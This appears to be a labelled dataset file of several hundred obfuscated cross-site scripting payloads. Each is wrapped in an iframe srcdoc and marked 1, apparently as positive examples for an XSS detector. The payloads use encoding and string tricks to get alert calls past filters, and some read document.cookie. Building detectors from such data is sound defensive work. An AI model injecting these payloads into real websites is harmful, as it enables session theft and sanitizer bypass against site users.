"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent(&#x27;%61%6C%65%72%74(1)&#x27;))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent('%61%6c%65%72%74%28%31%31%31%29'))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent('%77%69%6e%64%6f%77%2e%61%6c%65%72%74%28%31%29'))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent('%77%69%6e%64%6f%77%5b%27%61%6c%65%72%74%27%5d%28%31%29'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent('al%65rt(1)'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(eval('Str'+'\u0069ng.fromCharCode')(97,108,101,114,116,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(unescape('%61%6C%65%72%74%28%27%58%53%53%27%29'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(unescape('%61%6C%65%72%74%281%29'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(unescape('%61%6C%65%72%74(1)'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(unescape('%61%6c%65%72%74%28%27%58%53%53%27%29'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(unescape('%61%6c%65%72%74%28%31%31%31%29'))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(unescape('%61%6c%65%72%74(1)'))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(unescape('%61%6c%65%72%74(1)'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(unescape('%61%6c%65%72%74(49)'))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(unescape('%u0061%u006c%u0065%u0072%u0074%28%u0031%u0031%u0031%29'))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(window.atob('YWxlcnQoMSk='))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(window['al'+'ert'](1))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=import('data:text/javascript,alert(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=location=`javascript:alert\`2\``>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setInterval('al'+'ert(1)',1000)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(&#x27;&#x61;&#x6C;&#x65;&#x72;&#x74;(1)&#x27;,0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('a'+'lert(1)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('al'+'\x65rt(1)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('al'+'ert(1)',0)>"" />",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('al'+'ert(1)',0)>"">",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('al'+'ert(1)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('al'+'ert(2)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('al'+String.fromCharCode(101,114,116)+'(1)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('ale'+'rt(1)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('ale'+'rt(1)',1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('ev'+'al(`\\u0061lert(1)`)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('eval(String.fromCharCode(97,108,101,114,116,40,49,41))',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`,0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(`\\u0061l\\u0065rt(1)`,0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(`al`+`ert(1)`)>""</iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(`al`+`ert(1)`,0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(`ale`+'rt(1)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(atob('YWxlcnQ=')+'(1)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(atob('YWxlcnQoMSk='),0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(decodeURIComponent('%61%6C%65%72%74(1)'),0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(eval(String.fromCharCode(97,108,101,114,116,40,49,41)),0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(eval(atob('YWxlcnQoMSk=')),0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(eval(atob('YWxlcnQoMTEp')),0)>"">",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(window['al'+'ert'](1),0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window[&quot;al&quot;+&quot;ert&quot;](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['Function']('al'+'ert(1)')()>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['\x61\x6c\x65\x72\x74'](1)>"">",1
"<iframe srcdoc=""<img src=x onerror=window['\x61\x6c\x65\x72\x74'](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['\x65\x76\x61\x6c']('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['\x65\x76\x61\x6c']('\u0061\u006c\u0065\u0072\u0074(49,49,49)')>"">",1
"<iframe srcdoc=""<img src=x onerror=window['\x65\x76\x61\x6c']('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['a'+'lert'](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['a'+String.fromCharCode(108)+'ert'](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['al'+'\u0065rt'](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['al'+'\x65rt'](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['al'+'ert']('XSS')>"">",1
"<iframe srcdoc=""<img src=x onerror=window['al'+'ert'](1)>"">",1
"<iframe srcdoc=""<img src=x onerror=window['al'+'ert'](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['al'+'ert'](2)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['al'+'ert'](String.raw`1`)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['al\x65rt'](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['ale'+'rt'](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['ale'+'rt'](123)>"">",1
"<iframe srcdoc=""<img src=x onerror=window['eval']('al'+'ert(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window[String.fromCharCode(97,108,101,114,116)](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window[`al${String.fromCharCode(101,114,116)}`](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window[`al`+'ert']('1')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window[`al`+`ert`](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window[atob('YWxlcnQ=')](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window[atob('YWxlcnQ=')](123)>"">",1
"<iframe srcdoc=""<img src=x onerror=window[decodeURIComponent('%61%6c%65%72%74')](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window[unescape('%61%6C%65%72%74')](1)>""></iframe>",1
"<iframe srcdoc=""<meta charset='utf-8'><img src=x onerror=window['a'+unescape('%6Ce%72t')](1)>"">",1
"<iframe srcdoc=""<meta charset='utf-8'><svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)')></svg>"">",1
"<iframe srcdoc=""<object data='data:text/html,<img src=x onerror=eval(atob(`YWxlcnQoMSk=`))>'>""></iframe>",1
"<iframe srcdoc=""<object data='data:text/html,<img src=x onerror=window[atob(&quot;YWxlcnQ=&quot;)](1)>'></object>"">",1
"<iframe srcdoc=""<object data='data:text/html,<svg onload=alert(`1`)>'></object>""></iframe>",1
"<iframe srcdoc=""<object data='data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></object>""></iframe>",1
"<iframe srcdoc=""<object data='data:text/html,<svg onload=eval(atob(&quot;YWxlcnQoMSk=&quot;))>'></object>""></iframe>",1
"<iframe srcdoc=""<object data='data:text/html,<svg onload=eval(atob(`YWxlcnQoMSk=`))>'></object>""></iframe>",1
"<iframe srcdoc=""<object data='data:text/html,<svg onload=setTimeout(`alert(1)`,0)>'></object>""></iframe>",1
"<iframe srcdoc=""<object data='data:text/html,<svg onload=window[&quot;al&quot;+&quot;ert&quot;](1)>'></object>"">",1
"<iframe srcdoc=""<object data='data:text/html,<svg xmlns=&quot;http://www.w3.org/2000/svg&quot;><script>window[&quot;al&quot;+&quot;ert&quot;](5)</script></svg>'></iframe>"">",1
"<iframe srcdoc=""<object data='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='></object>""></iframe>",1
"<iframe srcdoc=""<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4='></object>""></iframe>",1
"<iframe srcdoc=""<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9IndpbmRvdy5hbGVydCgxKSI+PC9zdmc+'></object>""></iframe>",1
"<iframe srcdoc=""<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9J2FsZXJ0KDEpJz48L3N2Zz4='></object>""></iframe>",1
"<iframe srcdoc=""<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'>"" ></iframe>",1
"<iframe srcdoc=""<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'></object>""></iframe>",1
"<iframe srcdoc=""<object data=data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>""></object>""></iframe>",1
"<iframe srcdoc=""<object data=data:text/html,<svg onload=eval(atob('YWxlcnQoMSk='))></svg>>""></iframe>",1
"<iframe srcdoc=""<script type='text/javascript'>alert(1)</script>"">",1
"<iframe srcdoc=""<script>(()=>{window['ale'+'rt'](123)})()</script>""></iframe>",1
"<iframe srcdoc=""<script>(Function('alert(1)')())</script>""></iframe>",1
"<iframe srcdoc=""<script>Function('\u0061\u006c\u0065\u0072\u0074(40)')()</script>""></iframe>",1
"<iframe srcdoc=""<script>Function('\x61'+'\x6c'+'\x65'+'\x72'+'\x74(52)')()</script>""></iframe>",1
"<iframe srcdoc=""<script>Function('\x61\x6c\x65\x72\x74(28)')()</script>""></iframe>",1
"<iframe srcdoc=""<script>Function('al'+'ert(1)')()</script>"">",1
"<iframe srcdoc=""<script>Function('al'+'ert(16)')()</script>""></iframe>",1
"<iframe srcdoc=""<script>Function('return ale'+'rt')()('1')</script>"">",1
"<iframe srcdoc=""<script>\u0061\u006C\u0065\u0072\u0074(1)</script>""></iframe>",1
"<iframe srcdoc=""<script>al&#x65;rt(1)</script>"">",1
"<iframe srcdoc=""<script>al\u0065rt('XSS')</script>""></iframe>",1
"<iframe srcdoc=""<script>alert&#x28;&#49;&#x29;</script>"">",1
"<iframe srcdoc=""<script>alert&NewLine;&lpar;'XSS'&rpar;</script>"">",1
"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",1
"<iframe srcdoc=""<script>alert(String.fromCharCode(49,49,49))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval('&#97;&#108;&#101;&#114;&#116;&#40;1&#41;')</script>""></iframe>",1
"<iframe srcdoc=""<script>eval('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')</script>""></iframe>",1
"<iframe srcdoc=""<script>eval('\u0061\u006c\u0065\u0072\u0074(36)')</script>""></iframe>",1
"<iframe srcdoc=""<script>eval('\x61'+'\x6c'+'\x65'+'\x72'+'\x74(48)')</script>""></iframe>",1
"<iframe srcdoc=""<script>eval('\x61\x6c\x65\x72\x74(24)')</script>""></iframe>",1
"<iframe srcdoc=""<script>eval('al'+'ert(1)')</script>"">",1
"<iframe srcdoc=""<script>eval('al'+'ert(1)')</script>""></iframe>",1
"<iframe srcdoc=""<script>eval('al'+'ert(12)')</script>""></iframe>",1
"<iframe srcdoc=""<script>eval('al\x65rt(0x7b)')</script>""></iframe>",1
"<iframe srcdoc=""<script>eval('al\x65rt(111)')</script>""></iframe>",1
"<iframe srcdoc=""<script>eval('ale'+'rt(49,49,49)')</script>"">",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74).concat(String.fromCharCode(0x28,0x31,0x30,0x30,0x29)))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))</script>"">",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(document.cookie)')</script>"">",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(document.domain)')</script>"">",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97,108,101,114,116).concat(String.fromCharCode(40,49,50,51,41)))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97,108,101,114,116,40,39,49,39,41))</script>"">",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"">",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97,108,101,114,116,40,39,89,39,41))</script>"">",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"">",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))</script>"">",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97,108,101,114,116,40,53,41))</script>"">",1
"<iframe srcdoc=""<script>eval([...'al\x65rt(1)'].join(''))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(`al`+`ert(24)`)</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoIlhTUyIp'))</script>"">",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>"">",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoJzEnKQ=='))</script>"">",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoJzEwMCcp'))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoJzEyMycp'))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoMSk='))</script>"">",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoMSk='))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoMTAwKQ=='))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoMTExKQ=='))</script>"">",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoMTExKQ=='))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoMTEzKQ=='))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoMTIzKQ=='))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>"">",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>"">",1
"<iframe srcdoc=""<script>eval(atob('d2luZG93LmFsZXJ0KDEp'))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(decodeURIComponent('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))</script>"">",1
"<iframe srcdoc=""<script>eval(decodeURIComponent('%61%6c%65%72%74%28%27%58%53%53%27%29'))</script>"">",1
"<iframe srcdoc=""<script>eval(decodeURIComponent('%61%6c%65%72%74%28%31%31%31%29'))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(unescape('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))</script>"">",1
"<iframe srcdoc=""<script>eval(unescape('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))</script>"">",1
"<iframe srcdoc=""<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>"">",1
"<iframe srcdoc=""<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(unescape('%61%6c%65%72%74%28%31%32%33%29'))</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(unescape('\u0061\u006c\u0065\u0072\u0074(1)'))</script>""></iframe>",1
"<iframe srcdoc=""<script>import('data:text/javascript,al%65rt(123)')</script>""></iframe>",1
"<iframe srcdoc=""<script>let e=Function;new e('ale'+'rt(1)')()</script>"">",1
"<iframe srcdoc=""<script>let e=atob('YWxlcnQoMSk=');eval(e)</script>"">",1
"<iframe srcdoc=""<script>let e=unescape('%61%6c%65%72%74%28%31%29');eval(e)</script>"">",1
"<iframe srcdoc=""<script>setInterval(() => alert(1), 1000)</script>"">",1
"<iframe srcdoc=""<script>setInterval(()=>window['alert'](1),1000)</script>""></iframe>",1
"<iframe srcdoc=""<script>setInterval(()=>window[`al`+'ert']('XSS'),1000)</script>"">",1
"<iframe srcdoc=""<script>setInterval(function(){alert(1)}, 1000)</script>"">",1
"<iframe srcdoc=""<script>setTimeout('&#x61;&#108;&#101;&#114;&#116;(`4`)', 0)</script>"">",1
"<iframe srcdoc=""<script>setTimeout('&#x61;&#x6c;&#x65;&#x72;&#x74;(`24`)', 0)</script>"">",1
"<iframe srcdoc=""<script>setTimeout('al&#101;rt(1)',100);</script>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout('al'+'ert(123)',0)</script>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout('al'+String.fromCharCode(101,114,116)+'(1)',0)</script>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout('alert(52)', 0)</script>"">",1
"<iframe srcdoc=""<script>setTimeout(() => alert(40), 0)</script>"">",1
"<iframe srcdoc=""<script>setTimeout(() => window['al'+'ert'](1), 0)</script>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout(()=>{let a=atob('YWxlcnQoMSk=');eval(a)},0)</script>"">",1
"<iframe srcdoc=""<script>setTimeout(()=>{let a=unescape('%61%6c%65%72%74%28%31%29');eval(a)},0)</script>"">",1
"<iframe srcdoc=""<script>setTimeout(()=>{let e=atob('YWxlcnQoMSk=');eval(e)},0)</script>"">",1
"<iframe srcdoc=""<script>setTimeout(()=>{let e=window['\x65\x76\x61\x6c'];e('al'+'ert(1)')},0)</script>"">",1
"<iframe srcdoc=""<script>setTimeout(()=>{window[`al`+`ert`](1)},0)</script>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout(Function('al'+'ert(111)'),1000)</script>"">",1
"<iframe srcdoc=""<script>setTimeout(`alert(1)`, 0)</script>"">",1
"<iframe srcdoc=""<script>setTimeout(`alert(1)`,0)</script>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout(function(){alert(1)}, 0)</script>"">",1
"<iframe srcdoc=""<script>setTimeout(function(){window['\x61\x6c\x65\x72\x74']('\x58\x53\x53')},0)</script>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout(function(){window['\x61\x6c\x65\x72\x74'](1)},0)</script>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout(function(){window['al'+'ert'](1)},0)</script>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout(function(){window['ale'+'rt'](1)},0)</script>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout(function(){window[atob('YWxlcnQ=')]('1')},0)</script>"">",1
"<iframe srcdoc=""<script>top[atob('YWxlcnQ=')](1)</script>"">",1
"<iframe srcdoc=""<script>var z=atob('YWxlcnQoNTkp');eval(z)</script>""></iframe>",1
"<iframe srcdoc=""<script>window&#46;&#x61;lert(1)</script>"">",1
"<iframe srcdoc=""<script>window.location='javascript:'+unescape('%61%6c%65%72%74%28%31%29')</script>"">",1
"<iframe srcdoc=""<script>window[&quot;al&quot;+&quot;ert&quot;](1)</script>""></iframe>",1
"<iframe srcdoc=""<script>window['\u0061\u006c\u0065\u0072\u0074'](1)</script>""></iframe>",1
"<iframe srcdoc=""<script>window['\u0061\u006c\u0065\u0072\u0074'](32)</script>""></iframe>",1
"<iframe srcdoc=""<script>window['\x61'+'\x6c'+'\x65'+'\x72'+'\x74'](1)</script>""></iframe>",1
"<iframe srcdoc=""<script>window['\x61'+'\x6c'+'\x65'+'\x72'+'\x74'](44)</script>""></iframe>",1
"<iframe srcdoc=""<script>window['\x61\x6c\x65\x72\x74'](1)</script>""></iframe>",1
"<iframe srcdoc=""<script>window['\x61\x6c\x65\x72\x74'](20)</script>""></iframe>",1
"<iframe srcdoc=""<script>window['\x65\x76\x61\x6c'](unescape('%61%6c%65%72%74(49,49,49)'))</script>"">",1
"<iframe srcdoc=""<script>window['al'+'ert']('1')</script>"">",1
"<iframe srcdoc=""<script>window['al'+'ert']('XSS')</script>"">",1
"<iframe srcdoc=""<script>window['al'+'ert'](0b1)</script>"">",1
"<iframe srcdoc=""<script>window['al'+'ert'](0b11)</script>"">",1
"<iframe srcdoc=""<script>window['al'+'ert'](0o1)</script>"">",1
"<iframe srcdoc=""<script>window['al'+'ert'](0o11)</script>"">",1
"<iframe srcdoc=""<script>window['al'+'ert'](0x1)</script>"">",1
"<iframe srcdoc=""<script>window['al'+'ert'](0x31)</script>"">",1
"<iframe srcdoc=""<script>window['al'+'ert'](1)</script>"">",1
"<iframe srcdoc=""<script>window['al'+'ert'](1)</script>""></iframe>",1
"<iframe srcdoc=""<script>window['al'+'ert'](111)</script>"">",1
"<iframe srcdoc=""<script>window['al'+'ert'](4)</script>""></iframe>",1
"<iframe srcdoc=""<script>window['al'+'ert'](8)</script>""></iframe>",1
"<iframe srcdoc=""<script>window['al'+'ert'](String.fromCharCode(49))</script>"">",1
"<iframe srcdoc=""<script>window['al'+'ert'](atob('WFNT'))</script>""></iframe>",1
"<iframe srcdoc=""<script>window['al'+'ert'](unescape('%31%31%33'))</script>""></iframe>",1
"<iframe srcdoc=""<script>window['ale'+'rt'](1)</script>""></iframe>",1
"<iframe srcdoc=""<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>"">",1
"<iframe srcdoc=""<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>""></iframe>",1
"<iframe srcdoc=""<script>window[atob('YWxlcnQ=')](1)</script>"">",1
"<iframe srcdoc=""<script>window[unescape('%61%6C%65%72%74')](1)</script>""></iframe>",1
"<iframe srcdoc=""<script>window[unescape('%61%6c%65%72%74')](1)</script>""></iframe>",1
"<iframe srcdoc=""<script>with({})eval((()=>{return atob('YWxlcnQoMSkNCg==')})())</script>"">",1
"<iframe srcdoc=""<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"">",1
"<iframe srcdoc=""<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>""></iframe>",1
"<iframe srcdoc=""<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>"">",1
"<iframe srcdoc=""<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#50;&#51;&#41;>"">",1
"<iframe srcdoc=""<svg onload=&#97;&#108;&#101;&#114;&#116;&lpar;&#39;1&#39;&rpar;>"">",1
"<iframe srcdoc=""<svg onload=&#97;&#108;&#101;&#114;&#116;('XSS')>"">",1
"<iframe srcdoc=""<svg onload=&#97;&#108;&#101;&#114;&#x74;&#40;&#x31;&#x29;>"">",1
"<iframe srcdoc=""<svg onload=&#97;&#x6c;&#101;&#114;&#x74;&#40;&#47;&#88;&#83;&#x53;&#47;&#41;>"">",1
"<iframe srcdoc=""<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>"">",1
"<iframe srcdoc=""<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#40;&#x31;&#x32;&#x33;&#41;>"">",1
"<iframe srcdoc=""<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(String.fromCharCode(68))>"">",1
"<iframe srcdoc=""<svg onload=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;&#x27;&#x29;>"">",1
"<iframe srcdoc=""<svg onload=&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#40;&#x31;&#41;>"">",1
"<iframe srcdoc=""<svg onload=&#x73;&#x65;&#x74;&#x54;&#x69;&#x6d;&#x65;&#x6f;&#x75;&#x74;&#x28;&#x27;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;&#x27;&#x2c;&#x30;&#x29;>"">",1
"<iframe srcdoc=""<svg onload='&#97;&#108;&#101;&#114;&#116;`1`'>""></iframe>",1
"<iframe srcdoc=""<svg onload='&#x61;&#x6c;&#x65;&#x72;&#x74;(`12`)'>"">",1
"<iframe srcdoc=""<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))'/>""></iframe>",1
"<iframe srcdoc=""<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>"">",1
"<iframe srcdoc=""<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload='eval(atob(`YWxlcnQoMzYp`))'>"">",1
"<iframe srcdoc=""<svg onload='eval(unescape(&#34;%61%6c%65%72%74%28%27%58%53%53%27%29&#34;))'>"">",1
